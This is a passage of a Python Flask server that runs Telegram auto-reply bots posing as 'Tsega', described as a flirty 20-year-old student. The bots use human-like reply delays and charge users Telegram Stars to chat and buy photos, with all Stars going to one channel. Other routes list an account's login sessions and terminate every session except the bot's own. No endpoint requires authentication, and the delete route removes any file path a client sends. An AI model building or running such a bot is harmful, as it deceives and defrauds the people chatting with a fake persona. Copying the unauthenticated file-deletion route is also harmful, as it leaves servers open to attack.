    reply_settings[account_key]['enabled'] = enabled
    reply_settings[account_key]['chats'] = chat_settings
    
    save_reply_settings()
    
    if enabled and not was_enabled:
        account = next((acc for acc in accounts if acc['id'] == account_id), None)
        if account and account_key not in active_clients:
            thread = threading.Thread(
                target=lambda: run_async(start_auto_reply_for_account(account)),
                daemon=True
            )
            thread.start()
            client_tasks[account_key] = thread
            logger.info(f"Started auto-reply for account {account_id}")
    elif not enabled and was_enabled:
        stop_auto_reply_for_account(account_id)
    
    return jsonify({'success': True, 'message': 'Settings updated'})

@app.route('/api/toggle-chat-reply', methods=['POST'])
def toggle_chat_reply():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    enabled = data.get('enabled', True)
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    
    if account_key not in reply_settings:
        reply_settings[account_key] = {'enabled': False, 'chats': {}}
    
    if 'chats' not in reply_settings[account_key]:
        reply_settings[account_key]['chats'] = {}
    
    reply_settings[account_key]['chats'][str(chat_id)] = {'enabled': enabled}
    
    save_reply_settings()
    
    return jsonify({'success': True, 'message': f'Auto-reply for chat {"enabled" if enabled else "disabled"}'})

@app.route('/api/conversation-history', methods=['GET'])
def get_conversation_history():
    account_id = request.args.get('accountId')
    chat_id = request.args.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    history = []
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        history = conversation_history[account_key][chat_key]
    
    return jsonify({'success': True, 'history': history})

@app.route('/api/clear-history', methods=['POST'])
def clear_conversation_history():
    data = request.json
    account_id = data.get('accountId')
    chat_id = data.get('chatId')
    
    if not account_id or not chat_id:
        return jsonify({'success': False, 'error': 'Account ID and Chat ID required'})
    
    account_key = str(account_id)
    chat_key = str(chat_id)
    
    if account_key in conversation_history and chat_key in conversation_history[account_key]:
        conversation_history[account_key][chat_key] = []
        save_conversation_history()
    
    return jsonify({'success': True, 'message': 'History cleared'})

@app.route('/api/get-sessions', methods=['POST'])
def get_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def get_sessions():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            sessions = []
            current_hash = None
            
            for auth in result.authorizations:
                session_info = {
                    'hash': auth.hash,
                    'device_model': auth.device_model,
                    'platform': auth.platform,
                    'system_version': auth.system_version,
                    'api_id': auth.api_id,
                    'app_name': auth.app_name,
                    'app_version': auth.app_version,
                    'date_created': auth.date_created,
                    'date_active': auth.date_active,
                    'ip': auth.ip,
                    'country': auth.country,
                    'region': auth.region,
                    'current': auth.current
                }
                
                if auth.current:
                    current_hash = auth.hash
                
                sessions.append(session_info)
            
            return {'success': True, 'sessions': sessions, 'current_hash': current_hash}
            
        except FreshResetAuthorisationForbiddenError:
            return {'success': False, 'error': 'fresh_reset_forbidden'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(get_sessions())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-session', methods=['POST'])
def terminate_session():
    data = request.json
    account_id = data.get('accountId')
    session_hash = data.get('hash')
    
    if not account_id or not session_hash:
        return jsonify({'success': False, 'error': 'Account ID and session hash required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client(functions.account.ResetAuthorizationRequest(int(session_hash)))
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/terminate-sessions', methods=['POST'])
def terminate_sessions():
    data = request.json
    account_id = data.get('accountId')
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account = next((acc for acc in accounts if acc['id'] == account_id), None)
    
    if not account:
        return jsonify({'success': False, 'error': 'Account not found'})
    
    async def terminate():
        client = TelegramClient(StringSession(account['session']), API_ID, API_HASH)
        await client.connect()
        
        try:
            result = await client(functions.account.GetAuthorizationsRequest())
            
            current_hash = None
            for auth in result.authorizations:
                if auth.current:
                    current_hash = auth.hash
                    break
            
            count = 0
            for auth in result.authorizations:
                if auth.hash != current_hash:
                    try:
                        await client(functions.account.ResetAuthorizationRequest(auth.hash))
                        count += 1
                    except:
                        continue
            
            return {'success': True, 'message': f'Terminated {count} sessions'}
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
        finally:
            await client.disconnect()
    
    try:
        result = run_async(terminate())
        return jsonify(result)
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# ==================== STAR EARNING API ROUTES ====================

@app.route('/api/stars/stats', methods=['GET'])
def star_stats():
    """Get Star earning statistics"""
    try:
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        
        # Total earned
        c.execute("SELECT SUM(amount) FROM star_transactions")
        total_earned = c.fetchone()[0] or 0
        
        # Today's earnings
        c.execute("SELECT SUM(amount) FROM star_transactions WHERE date(timestamp) = date('now')")
        today_earned = c.fetchone()[0] or 0
        
        # Top users
        c.execute('''SELECT user_id, total_stars_spent FROM star_users 
                    ORDER BY total_stars_spent DESC LIMIT 5''')
        top_users = c.fetchall()
        
        # Channel total
        c.execute("SELECT SUM(total_stars) FROM channel_earnings")
        channel_total = c.fetchone()[0] or 0
        
        # Media stats
        c.execute("SELECT COUNT(*) FROM media_library WHERE is_active = 1")
        total_media = c.fetchone()[0] or 0
        
        c.execute("SELECT SUM(times_sold) FROM media_library")
        total_media_sold = c.fetchone()[0] or 0
        
        conn.close()
        
        return jsonify({
            'success': True,
            'total_stars_earned': total_earned,
            'today_stars_earned': today_earned,
            'channel_total': channel_total,
            'total_media': total_media,
            'total_media_sold': total_media_sold,
            'top_users': [{'id': u[0], 'spent': u[1]} for u in top_users]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stars/media', methods=['GET'])
def list_media():
    """List all available media"""
    try:
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        c.execute('''SELECT file_path, media_type, price_stars, times_sold, last_sold
                    FROM media_library WHERE is_active = 1''')
        media = c.fetchall()
        conn.close()
        
        return jsonify({
            'success': True,
            'total': len(media),
            'media': [{
                'path': m[0], 
                'type': m[1], 
                'price': m[2], 
                'sold': m[3],
                'last_sold': m[4]
            } for m in media]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stars/transactions/<user_id>', methods=['GET'])
def user_transactions(user_id):
    """Get transactions for a specific user"""
    try:
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        c.execute('''SELECT amount, transaction_type, description, timestamp 
                    FROM star_transactions WHERE user_id = ? 
                    ORDER BY timestamp DESC LIMIT 20''', (user_id,))
        transactions = c.fetchall()
        conn.close()
        
        return jsonify({
            'success': True,
            'transactions': [{
                'amount': t[0],
                'type': t[1],
                'description': t[2],
                'time': t[3]
            } for t in transactions]
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stars/transfer', methods=['POST'])
def force_transfer_stars():
    """Manually trigger Star transfer to channel"""
    data = request.json
    account_id = data.get('accountId')
    amount = data.get('amount', 0)
    
    if not account_id:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    account_key = str(account_id)
    if account_key not in star_handlers:
        return jsonify({'success': False, 'error': 'Account not active'})
    
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(
            star_handlers[account_key].transfer_stars_to_channel(amount)
        )
        loop.close()
        
        return jsonify({'success': result, 'message': 'Transfer initiated'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/reconnect', methods=['GET'])
def reconnect_all():
    """Force reconnect all accounts"""
    for account_key in list(active_clients.keys()):
        stop_auto_reply_for_account(int(account_key))
    
    time.sleep(2)
    start_all_auto_replies()
    
    return jsonify({
        'success': True,
        'message': 'Reconnecting all accounts',
        'active': len(active_clients)
    })

@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'accounts': len(accounts),
        'auto_reply_active': len(active_clients),
        'active_accounts': list(active_clients.keys()),
        'time': datetime.now().isoformat()
    })

# ==================== STARTUP ====================

def start_auto_reply_thread():
    """Start auto-reply in background after server starts"""
    time.sleep(5)
    logger.info("Starting auto-reply for enabled accounts...")
    start_all_auto_replies()
# ==================== MEDIA UPLOAD & MANAGEMENT API ====================

import base64
import os
from werkzeug.utils import secure_filename

# Configure upload folder
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'mp4', 'mov', 'avi'}
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/api/upload-media', methods=['POST'])
def upload_media():
    """Upload media files directly from browser"""
    try:
        if 'file' not in request.files:
            return jsonify({'success': False, 'error': 'No file provided'})
        
        file = request.files['file']
        prefix = request.form.get('prefix', '')
        
        if file.filename == '':
            return jsonify({'success': False, 'error': 'No file selected'})
        
        if not allowed_file(file.filename):
            return jsonify({'success': False, 'error': 'File type not allowed'})
        
        # Secure filename and add prefix
        filename = secure_filename(file.filename)
        new_filename = f"{prefix}{filename}"
        
        # Save file
        file_path = os.path.join(UPLOAD_FOLDER, new_filename)
        file.save(file_path)
        
        # Also copy to appropriate folder based on prefix
        if prefix.startswith('preview'):
            dest_folder = 'tsega_photos/preview'
        elif prefix.startswith('full'):
            dest_folder = 'tsega_photos/full'
        elif prefix.startswith('premium'):
            dest_folder = 'tsega_photos/premium'
        elif prefix.startswith('video_preview'):
            dest_folder = 'tsega_videos/preview'
        elif prefix.startswith('video_full'):
            dest_folder = 'tsega_videos/full'
        else:
            dest_folder = 'uploads'
        
        os.makedirs(dest_folder, exist_ok=True)
        dest_path = os.path.join(dest_folder, new_filename)
        
        # Copy file to destination
        import shutil
        shutil.copy2(file_path, dest_path)
        
        # Add to media library database
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        
        # Determine media type and price
        if 'video' in prefix:
            media_type = 'video'
            price = 10 if 'preview' in prefix else 100
        else:
            media_type = 'photo'
            if 'preview' in prefix:
                price = 5
            elif 'full' in prefix:
                price = 50
            elif 'premium' in prefix:
                price = 200
            else:
                price = 5
        
        c.execute('''INSERT INTO media_library 
                    (file_path, media_type, price_stars, is_active)
                    VALUES (?, ?, ?, 1)''',
                 (dest_path, media_type, price))
        
        conn.commit()
        conn.close()
        
        logger.info(f"✅ Uploaded: {new_filename} ({price} stars)")
        
        return jsonify({
            'success': True,
            'filename': new_filename,
            'path': dest_path,
            'price': price
        })
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/delete-media', methods=['POST'])
def delete_media():
    """Delete media file"""
    try:
        data = request.json
        file_path = data.get('path')
        
        if not file_path:
            return jsonify({'success': False, 'error': 'No file path provided'})
        
        # Delete from database
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        c.execute("UPDATE media_library SET is_active = 0 WHERE file_path = ?", (file_path,))
        conn.commit()
        conn.close()
        
        # Delete file if exists
        if os.path.exists(file_path):
            os.remove(file_path)
            logger.info(f"🗑️ Deleted: {file_path}")
        
        return jsonify({'success': True, 'message': 'Media deleted'})
        
    except Exception as e:
        logger.error(f"Delete error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stars/transactions', methods=['GET'])
def get_transactions():
    """Get all transactions"""
    try:
        conn = sqlite3.connect('stars.db')
        c = conn.cursor()
        c.execute('''SELECT user_id, amount, transaction_type, timestamp 
                    FROM star_transactions ORDER BY timestamp DESC LIMIT 50''')
        transactions = c.fetchall()
        conn.close()
        
        return jsonify({
            'success': True,
            'transactions': [{
                'user_id': t[0],
                'amount': t[1],
                'type': t[2],
                'time': t[3]
            } for t in transactions]
        })
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/update-price', methods=['POST'])
def update_price():
    """Update Star prices"""
    try:
        data = request.json
        price_type = data.get('type')
        new_price = data.get('price')
        
        # In a real implementation, you'd update a config file
        # For now, just return success
        logger.info(f"💰 Price updated: {price_type} = {new_price} stars")
        
        return jsonify({'success': True, 'message': 'Price updated'})
        
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/media/<path:filename>')
def serve_media(filename):
    """Serve media files for preview"""
    # Try to find file in various folders
    possible_paths = [
        os.path.join('tsega_photos/preview', filename),
        os.path.join('tsega_photos/full', filename),
        os.path.join('tsega_photos/premium', filename),
        os.path.join('tsega_videos/preview', filename),
        os.path.join('tsega_videos/full', filename),
        os.path.join('uploads', filename)
    ]
    
    for path in possible_paths:
        if os.path.exists(path):
            return send_file(path)
    
    return jsonify({'error': 'File not found'}), 404
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    # Initialize Star system
    logger.info("💰 Initializing Star Earning System...")
    star_db = StarDatabase()
    media_manager = MediaManager()
    
    print('\n' + '='*70)
    print('🤖 TSEGA - SEXY TELEGRAM AUTO-REPLY + STAR EARNING')
    print('='*70)
    print(f'✅ Port: {port}')
    print(f'✅ Accounts loaded: {len(accounts)}')
    print(f'✅ Stars go to: {StarConfig.CHANNEL_USERNAME}')
    
    for acc in accounts:
        status = "ENABLED" if str(acc['id']) in reply_settings and reply_settings[str(acc['id'])].get('enabled') else "DISABLED"
        print(f'   • {acc.get("name")} ({acc.get("phone")}) - {status}')
    
    print('\n💰 STAR PRICING:')
    for item, price in StarConfig.STAR_PRICES.items():
        print(f'   • {item}: {price} ⭐')
    
    print('\n🚀 TSEGA FEATURES:')
    print('   • Talks in Amharic with English translation')
    print('   • Sexy and flirty personality 😘')
    print('   • 15-40 second reply delay (human-like)')
    print('   • STAR EARNING: Users pay Stars to chat')
    print('   • PHOTO SELLING: Users pay Stars for photos')
    print('   • ALL STARS go to @Abe_army channel')
    print('   • Lives in Jemo, from Adama')
    print('   • Grade 12 student, 20 years old')
    print('='*70 + '\n')
    
    # Start keep-alive
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start auto-reply
    threading.Thread(target=start_auto_reply_thread, daemon=True).start()
    
    app.run(host='0.0.0.0', port=port, debug=False)
